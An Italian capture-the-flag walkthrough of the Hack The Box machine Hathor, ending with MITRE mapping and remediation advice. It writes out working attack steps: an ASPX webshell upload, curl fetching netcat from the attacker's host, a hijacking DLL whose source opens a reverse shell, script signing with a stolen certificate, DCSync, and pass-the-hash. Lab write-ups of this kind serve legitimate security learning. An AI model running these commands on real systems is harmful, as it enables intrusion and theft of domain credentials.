---
title: 'HTB Hathor Walkthrough ITA: AppLocker Bypass, DLL Hijacking e DCSync su Windows Insane'
slug: htb-hator-walktrough
description: 'Walkthrough HTB Hathor: AppLocker bypass, DLL hijacking su SMB, code signing con certificato rubato e DCSync senza NTLM. Macchina Windows Insane'
image: /hator-walktrough-htb.webp
draft: true
date: 2026-05-30T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - hackthebox
  - applocker
featured: true
---

HTB Hathor è una delle macchine Windows più ostiche di Hack The Box — **rating Insane**, e te ne accorgi subito. Ogni step ha un blocco in più: AppLocker, Windows Defender, firewall outbound, NTLM disabilitato. Non basta saper usare i tool — devi capire come funziona ogni difesa per aggirarla. In questo walkthrough vedi l'intera kill chain: da una web app CMS fino al DCSync finale, passando per DLL hijacking, code signing con certificato rubato dal Recycle Bin e autenticazione Kerberos pura.

***

## Recon

```bash
nmap -p- --min-rate 10000 10.10.11.147
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.147
```

Porte aperte rilevanti: DNS (53), HTTP (80), Kerberos (88), LDAP (389), SMB (445), WinRM (5985). Il certificato TLS su LDAP rivela l'hostname `hathor.windcorp.htb` e il dominio `windcorp.htb`. Aggiungi entrambi a `/etc/hosts`.

**NTLM è disabilitato** — lo capisci subito quando SMB risponde `STATUS_NOT_SUPPORTED`. Tutto passa da Kerberos. Tienilo a mente dall'inizio perché condiziona ogni step successivo.

```bash
crackmapexec smb 10.10.11.147 --shares -u guest -p ''
# [-] STATUS_NOT_SUPPORTED → NTLM off
```

Porte ad alta priorità: HTTP (80) e SMB (445). WinRM (5985) è aperto — utile se troviamo credenziali valide.

***

## Shell as web

### CVE-2022-40123 — Path Traversal (parziale)

La porta 80 espone **mojoPortal v2.7**. Registro un utente normale e provo subito la path traversal nota su questa versione. Il parametro `f` di `/DesignTools/CssEditor.aspx` non sanifica il path:

```
/DesignTools/CssEditor.aspx?s=framework&f=../../../../../web.config
```

La vulnerabilità funziona — la request passa, la risposta torna. Il problema è che non riesco a leggere nulla di utile: i file sensibili sono inaccessibili con questo utente o l'output è vuoto. Dead end.

### Accesso admin — credenziali di default

Cerco online vulnerabilità su mojoPortal v2.7 e trovo un blog che menziona le credenziali di default: `admin@admin.com / admin`. Le provo — entrano. Accesso al pannello di amministrazione completo.

### CVE-2022-40341 — Arbitrary File Upload → Webshell

mojoPortal v2.7 non valida il contenuto dei file caricati tramite il File Manager su `/Admin/FileManagerAlt.aspx`. Il filtro controlla solo l'estensione al momento dell'upload — blocca `.aspx` direttamente — ma non blocca `.png`.

Prendo la reverse shell ASPX da [borjmz/aspx-reverse-shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx), imposto IP e porta, e salvo il file come `foto.png`. Dal File Manager uso il form di upload — il file viene accettato senza problemi perché l'estensione è `.png`.

Individuo il path pubblico guardando dove finiscono gli altri file media del sito: `underconstruction.png` è sotto `/Data/Sites/1/media/`, quindi `foto.png` è lì. Poi uso la funzione **Copy** del File Manager per copiarlo con nome `foto.aspx` — il rename diretto è bloccato lato server, la copia con nome diverso no.

```
Webshell: http://10.10.11.147/Data/Sites/1/media/foto.aspx
```

Provo subito una reverse shell PowerShell base64 — bloccata da Defender. `Invoke-WebRequest` non esce. `nc64.exe` non connette outbound. Qualcosa blocca pesantemente l'ambiente — enumero le difese prima di procedere.

### Enumerazione difese

```powershell
# Defender
Get-MpComputerStatus | select AMRunningMode, RealTimeProtectionEnabled
# RealTimeProtectionEnabled: True

# PowerShell Language Mode
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage → AppLocker attivo

# AppLocker — stato enforcement per categoria
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | select RuleCollectionType, EnforcementMode

# AppLocker — regole complete
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | Format-List

# AppLocker — solo Allow
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | Format-List | Out-String | Select-String "Allow"

# Firewall — stato profili
netsh advfirewall show allprofiles state

# Firewall — blocchi outbound per programma
Get-NetFirewallRule -PolicyStore ActiveStore | where { $_.Action -eq "Block" } | select DisplayName, Direction
```

Il quadro completo:

**Defender**: attivo, real-time protection on. Qualsiasi payload MSF viene rimosso in secondi.

**ConstrainedLanguage**: AppLocker attivo, PS non può usare tipi .NET arbitrari o COM objects.

**AppLocker** permette:

* DLL: firmate Microsoft, in `Program Files`/`Windows`, oppure esplicitamente `C:\share\scripts\7-zip64.dll` e `C:\Get-bADpasswords\PSI\Psi_x64.dll`
* EXE: firmati da `administrator@windcorp.com`, oppure `C:\share\Bginfo64.exe` (whitelistato per path)
* Script `.ps1`: firmati da `administrator@windcorp.htb`

**Firewall** blocca outbound per programma (16 regole): `cscript`, `PowerShell`, `PowerShell ISE`, `regsvr32`, `rundll32`, `wscript`, `certutil`, `certoc`, `AutoIt` — 32 e 64 bit.

**`curl` su cmd non è bloccato** — questo diventa il vettore per scaricare file sulla macchina senza passare da PS o certutil:

```cmd
curl http://10.10.14.X/nc64.exe -o C:\Windows\Temp\nc64.exe
```

### Insomnia Webshell → Shell

Carico **Insomnia webshell** con lo stesso metodo di prima (`.png` → copia come `.aspx`). Insomnia gira nel contesto del processo IIS, che non è nella lista dei blocchi firewall. Uso la funzione built-in "Connect Back Shell":

```bash
nc -lvnp 80
# Connection received on 10.10.11.147
# Microsoft Windows [Version 10.0.20348.643]
# windcorp\web
```

***

## SMB as BeatriceMill

### Enumerazione

In `C:\Get-bADpasswords\Accessible\CSVs\` ci sono export periodici delle password deboli del dominio. Il più recente contiene:

```
Activity;Password Type;Account Name;Account password hash
active;weak;BeatriceMill;9cb01504ba0247ad5c6e08f7ccae7903
```

Hash MD5 crackabile su CrackStation: **`!!!!ilovegood17`**

### Kerberos al posto di NTLM

NTLM è disabilitato — `STATUS_NOT_SUPPORTED` su qualsiasi tentativo diretto. Configuri `/etc/krb5.conf`:

```ini
[libdefaults]
    default_realm = WINDCORP.HTB

[realms]
    WINDCORP.HTB = {
        kdc = HATHOR.WINDCORP.HTB
        admin_server = HATHOR.WINDCORP.HTB
    }
```

```bash
kinit beatricemill
# inserisci !!!!ilovegood17
klist
# Ticket cache: FILE:/tmp/krb5cc_1000
# Default principal: beatricemill@WINDCORP.HTB
```

Importante: usa l'**hostname**, non l'IP. Kerberos richiede risoluzione DNS — aggiungi il DC come nameserver in `/etc/resolv.conf` se le query falliscono.

```bash
# SMB con Kerberos
crackmapexec smb hathor.windcorp.htb -k -d windcorp.htb -u beatricemill -p '!!!!ilovegood17' --shares

# oppure smbclient.py (Impacket) — non richiede nameserver
smbclient.py -k 'windcorp.htb/beatricemill:!!!!ilovegood17@hathor.windcorp.htb'
```

BeatriceMill ha READ/WRITE sullo share `share`. Dentro: `AutoIt3_x64.exe`, `Bginfo64.exe`, e la cartella `scripts/` con `7-zip64.dll`.

***

## Shell as GinaWild

### Enumerazione dello share

Con un loop di monitoring verifichi che entrambi i processi girano come task schedulato ogni \~3 minuti, nel contesto di `GinaWild`:

```cmd
FOR /L %i IN (0,1,1000) DO (
  tasklist /FI "imagename eq AutoIt3_x64.exe" | findstr /v "No tasks" &
  tasklist /FI "imagename eq Bginfo64.exe" | findstr /v "No tasks" &
  ping -n 2 127.0.0.1 > NUL
)
```

\~30 secondi di `AutoIt3_x64.exe`, poi \~10 secondi di `Bginfo64.exe`. Gira come GinaWild.

### DLL Hijacking — verifica permessi

Prima provi a sovrascrivere direttamente gli EXE via SMB — `NT_STATUS_ACCESS_DENIED`. Ma le **DLL non sono bloccate**:

```bash
smb: \scripts\> put nc64.exe 7-zip64.dll
# putting file nc64.exe as \scripts\7-zip64.dll ✓
```

`7-zip64.dll` è whitelistata da AppLocker e scrivibile da tutti. Il task AutoIt la carica — se la sostituisci con una DLL malevola, ottieni esecuzione come GinaWild.

Prima provi una DLL con solo un ping per verificare l'esecuzione:

```cpp
case DLL_PROCESS_ATTACH:
    system("cmd.exe /c ping 10.10.14.X");
```

```bash
sudo tcpdump -ni tun0 icmp
# ICMP echo request da 10.10.11.147 → esecuzione confermata
```

### Strategia: AutoIt bloccato → Bginfo64 non bloccato

AutoIt è bloccato outbound dal firewall — una reverse shell diretta dalla DLL non funziona. Però GinaWild ha **WO (WriteOwner) su `Bginfo64.exe`**, che è whitelistato in AppLocker e NON bloccato outbound. La DLL fa 4 cose in sequenza:

```cpp
// reverse.cpp - Visual Studio, Release x64
#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
            system("cmd.exe /c icacls C:\\share\\Bginfo64.exe /q /c /t /grant ginawild:F");
            system("cmd.exe /c copy /Y C:\\Windows\\Temp\\nc64.exe C:\\share\\Bginfo64.exe");
            system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd 10.10.14.X 9003");
            break;
    }
    return TRUE;
}
```

> `icacls` con `/q /c /t /grant ginawild:F` — senza questi flag il comando può fallire silenziosamente.

Compili (Release x64), carichi su SMB sovrascrivendo `scripts\7-zip64.dll`, aspetti il task:

```bash
nc -lvnp 9003
# Connection received on 10.10.11.147
# windcorp\GinaWild
```

***

## Shell as bpassrunner

### Enumerazione — Desktop link e Recycle Bin

Sul Desktop pubblico (`C:\Users\Public\Desktop\`) c'è un file `bAD Passwords.lnk`. Risolvi il target:

```powershell
$sh = New-Object -ComObject WScript.Shell
$sh.CreateShortcut('.\bAD Passwords.lnk').TargetPath
# C:\Get-bADpasswords\run.vbs
```

`run.vbs` è già firmato (ha un signature block in fondo) — può girare sotto AppLocker. Triggera l'esecuzione di `Get-bADpasswords.ps1`.

Nel Recycle Bin di GinaWild (SID: `-2663`):

```cmd
dir /a C:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663\
# $IZIX7VV.pfx  (metadata)
# $RLYS3KF.pfx
# $RZIX7VV.pfx
```

Il file di metadati rivela il nome originale: `C:\Users\GinaWild\Desktop\cert.pfx`. Copi tutto nello share SMB e scarichi su Kali.

### Crack del certificato PFX

```bash
# Analisi iniziale
openssl pkcs12 -in cert.pfx -info
# chiede password

# pfx2john + john
pfx2john '$RLYS3KF.pfx' > cert.hash
john cert.hash --wordlist=/usr/share/wordlists/rockyou.txt
# Password: abceasyas123

# Verifica contenuto
openssl pkcs12 -in '$RLYS3KF.pfx' -passin pass:abceasyas123 -info -noout

# Subject e Extended Key Usage
openssl pkcs12 -in '$RLYS3KF.pfx' -passin pass:abceasyas123 -nokeys | \
  openssl x509 -noout -text | grep -A5 "Subject\|Extended Key"
# Subject: CN=Administrator, CN=Users, DC=windcorp, DC=htb
# Extended Key Usage: Code Signing

# Estrai CA chain
openssl pkcs12 -in '$RLYS3KF.pfx' -passin pass:abceasyas123 -nokeys -cacerts -out ca.pem
```

Il certificato è intestato a `CN=Administrator` con **Code Signing** come EKU. AppLocker permette script `.ps1` firmati da `administrator@windcorp.htb`. Questo è il bypass.

### Hijack di Get-bADpasswords.ps1

`Get-bADpasswords.ps1` gira come `bpassrunner` — account con privilegi di replica AD. Scarichi lo script via SMB (rinominandolo `.txt` perché `.ps1` è bloccato sullo share), aggiungi in cima il payload, poi firmi su Windows:

```powershell
$pass = ConvertTo-SecureString -String 'abceasyas123' -AsPlainText -Force
$cert = Import-PfxCertificate -FilePath C:\temp\cert.pfx `
  -Password $pass -CertStoreLocation Cert:\CurrentUser\My

Set-AuthenticodeSignature C:\Get-bADpasswords\Get-bADpasswords.ps1 -Certificate $cert
# Status: Valid ✓
```

Payload aggiunto in cima allo script:

```powershell
C:\share\Bginfo64.exe -e cmd 10.10.14.X 9004
```

Triggeri con:

```cmd
cscript C:\Get-bADpasswords\run.vbs
```

```bash
nc -lvnp 9004
# Connection received on 10.10.11.147
# windcorp\bpassrunner
```

***

## Shell as Administrator

### DCSync

`bpassrunner` ha i permessi *Replicating Directory Changes All*. Ne approfitto per fare DCSync su tutti gli utenti del dominio — per sfizio, ma anche per raccogliere tutti gli hash:

```powershell
# Tutti e 3 gli utenti interessanti
Get-ADReplAccount -SamAccountName administrator -Server 'hathor.windcorp.htb'
Get-ADReplAccount -SamAccountName GinaWild -Server 'hathor.windcorp.htb'
Get-ADReplAccount -SamAccountName bpassrunner -Server 'hathor.windcorp.htb'
# Administrator NTHash: b3ff8d7532eef396a5347ed33933030f
```

### Shell finale con nxc

NTLM è disabilitato — con `-k` netexec usa Kerberos, e con `-H` passa l'hash NT per ottenere il TGT. Non serve prima `getTGT.py` — nxc gestisce tutto internamente. Uso `-x` per eseguire direttamente il comando sulla macchina:

```bash
nxc smb 10.129.230.109 -u administrator -H 'b3ff8d7532eef396a5347ed33933030f' \
  -d windcorp.htb -k -x "C:\share\Bginfo64.exe 10.10.14.123 8888 -e cmd.exe"
```

```bash
nc -lvnp 8888
# Connection received on 10.10.11.147
# windcorp\Administrator
# C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

***

## MITRE ATT\&CK Coverage

| Tecnica                      | ID        | Descrizione                                                        |
| ---------------------------- | --------- | ------------------------------------------------------------------ |
| Default Credentials          | T1078.001 | Login mojoPortal [admin@admin.com](mailto:admin@admin.com) / admin |
| Unrestricted File Upload     | T1505.003 | PNG con ASPX rinominato via Copy (CVE-2022-40341)                  |
| DLL Side-Loading             | T1574.002 | Sovrascrittura 7-zip64.dll via SMB                                 |
| File Permission Modification | T1222.001 | takeown + icacls su Bginfo64.exe da GinaWild                       |
| Subvert Trust: Code Signing  | T1553.002 | PS1 firmato con cert dal Recycle Bin                               |
| DCSync                       | T1003.006 | Get-ADReplAccount come bpassrunner                                 |
| Pass-the-Hash via Kerberos   | T1550.003 | TGT da NT hash con NTLM disabilitato                               |

***

## Detection & Remediation

* **Credenziali di default**: qualsiasi CMS va hardened prima del deploy — `admin@admin.com / admin` su mojoPortal è ancora il default
* **Upload restriction bypass**: bloccare solo l'estensione al momento dell'upload non basta — il controllo va applicato anche su rename e copy
* **Scrittura DLL su share SMB**: sovrascrittura di una DLL whitelistata da parte di un utente non-admin è un segnale forte — Event ID 5145
* **Modifica permessi**: Event ID 4670 da utenti non-admin su path critici va alertato
* **Certificati di code signing nel Recycle Bin**: ruota e revoca immediatamente
* **Privilegi DCSync**: solo account di servizio specifici devono avere *Replicating Directory Changes All* — monitora con Event ID 4662

***

## Link interni

* [DCSync Attack](https://hackita.it/articoli/dcsync/)

## Link esterni

* [Get-bADpasswords – GitHub](https://github.com/improsec/Get-bADpasswords)
* [CVE-2022-40341 – PoC e dettagli tecnici](https://weed-1.gitbook.io/cve/mojoportal/upload-malicious-file-in-mojoportal-v2.7-cve-2022-40341)
* [MITRE ATT\&CK – T1574.002 DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)
